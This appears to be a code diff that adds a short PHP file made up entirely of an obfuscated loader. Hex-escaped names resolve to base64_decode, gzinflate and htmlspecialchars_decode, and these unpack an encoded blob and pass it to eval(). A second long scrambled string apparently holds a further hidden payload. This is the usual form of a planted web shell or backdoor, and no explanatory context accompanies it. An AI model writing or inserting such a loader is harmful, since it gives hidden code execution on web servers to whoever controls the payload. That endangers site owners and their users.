@@ -1,0 +1,5 @@
+<?php
+$keys = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNzC4pSi4upI5yUWJxqZhKfkpqcn5KqAbSzKLVMQyU9P6k4GahWEwlYAwA=";
+$gobscate = "\x3d8PYUPxlZxpyUJFnvX4SqNo\x42kDqTqe\x42eh3hR1k\x43h0jG8NZTtFxuIQwUspvX88sUf4UX\x431WP0/psN1nN32\x2bQhr9ztMe/fW4lZ2jd81uG\x420Q22hZ/\x41yygrKN1lWo\x43goLYIy7WoKLMU7WyK8N/o8YjL\x61dL\x61FD\x2b\x63gyktJIkUJfrNvt374Yu2\x61L\x61\x43sdf/WMwi6g8W\x61oEhEt0od7og9idv\x41ZZQ/L47G\x42RI\x43sQQM24/m\x42Qm\x42wJe/vF\x41kGw/W\x42Qq\x42wJe/vE\x410Gw/G\x42Qu\x42wJe/vD\x41EHw/2\x41Qy\x42wJe"; $Sy1LzNFQ = "\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c\x63\x68\x61\x72\x73\x5f\x64\x65\x63\x6f\x64\x65"; $srdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNzC4pSi4upI5yUWJxq ="\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65"; $ZhKfkpqcn5KqAbSzKLVMQyU9P6k4GahWEwlYAwA = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";
+eval($Sy1LzNFQ($srdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNzC4pSi4upI5yUWJxq($ZhKfkpqcn5KqAbSzKLVMQyU9P6k4GahWEwlYAwA($keys))));
+?>
